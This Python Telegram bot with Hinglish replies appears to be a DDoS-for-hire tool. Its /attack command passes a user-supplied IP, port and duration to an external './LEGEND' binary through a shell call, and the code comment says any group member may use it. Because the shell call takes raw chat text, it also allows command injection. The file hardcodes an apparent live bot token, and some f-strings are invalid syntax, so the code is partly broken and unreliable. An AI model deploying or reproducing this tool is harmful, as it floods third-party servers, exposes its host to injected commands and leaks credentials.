import telebot
import time
import subprocess
import random

# Bot token and admin information
BOT_TOKEN = '7228305815:AAGZvYtuYd6BC1J1qYeneQFPzDa4XDW5tYQ'
ADMIN_ID = 1232047106
OWNER_NAME = '@OWNERSRK'
CHANNEL_LINK = 'https://youtube.com/@zeroflexislive?si=zRItV1qSr1cGoEqX'

# Initialize the bot
bot = telebot.TeleBot(BOT_TOKEN)

# User Management
authorized_users = set([ADMIN_ID])

# Fun welcome messages
welcome_messages = [
    f"Ae bhai! {@OWNERSRK} ka bot idhar hai!",
    f"{@OWNERSRK} ka bot aa gaya!",
    f"Yo! {@OWNERSRK} ke bot me swagat hai!"
]

# Short and savage replies
savage_replies = [
    f"Chup be! 🚫",
    f"Bakchodi band! 😏",
    f"Dimag mat kha! 😆",
    f"Zyada ud mat! 😂",
    f"Permission nahi hai! 🚫",
    f"Nikal yaha se! 🖕",
    f"Bas kar! 😑",
    f"Over-smart mat ban! 🤨",
    f"Teri aukaat nahi! 😜"
]

# Start command
@bot.message_handler(commands=['start'])
def start(message):
    response = random.choice(welcome_messages)
    bot.reply_to(message, response)

# Add user command (Admin only)
@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            authorized_users.add(user_id)
            bot.reply_to(message, f"User {user_id} ko gang me shamil kar liya! ✅")
        except (IndexError, ValueError):
            bot.reply_to(message, "Sahi ID bhejo! 🤨")
    else:
        bot.reply_to(message, random.choice(savage_replies))

# Remove user command (Admin only)
@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in authorized_users:
                authorized_users.remove(user_id)
                bot.reply_to(message, f"User {user_id} ko gang se nikal diya! 🚫")
            else:
                bot.reply_to(message, "Pehle se bahar hai! 😏")
        except (IndexError, ValueError):
            bot.reply_to(message, "Sahi ID bhejo! 😠")
    else:
        bot.reply_to(message, random.choice(savage_replies))

# Attack command (Open for all group users)
@bot.message_handler(commands=['attack'])
def attack(message):
    try:
        _, ip, port, duration = message.text.split()
        duration = min(int(duration), 180)
        command = f"./LEGEND {ip} {port} {duration}"

        try:
            subprocess.Popen(command, shell=True)
            bot.reply_to(message, f"🚨 Bhai ne attack thok diya! 🎯 Target: {ip}:{port} for {duration} sec. 💥\n"
                                  f"{random.choice(['Bhai ne baja di!', 'Full garmi me hai bhai!', 'Aag laga di bhai!', 'Bot ko lightly mat lena!'])}")

            # Attack finish message with YouTube promotion
            def attack_finish():
                bot.reply_to(message, f"💥 Attack khatam! Bhai ne kaam tamam kar diya! 😎\n"
                                      f"Apna bhai ka YouTube channel zaroor check karein: {CHANNEL_LINK}")

            # Timer to send the finish message after attack duration
            time.sleep(duration)
            attack_finish()

        except Exception as e:
            bot.reply_to(message, f"Error: {e} 😵")

    except (IndexError, ValueError):
        bot.reply_to(message, "Format: /attack <ip> <port> <time> (Max 180 sec) ⚠️")

# Start the bot
print("Bot is running... 🚀")
bot.infinity_polling()
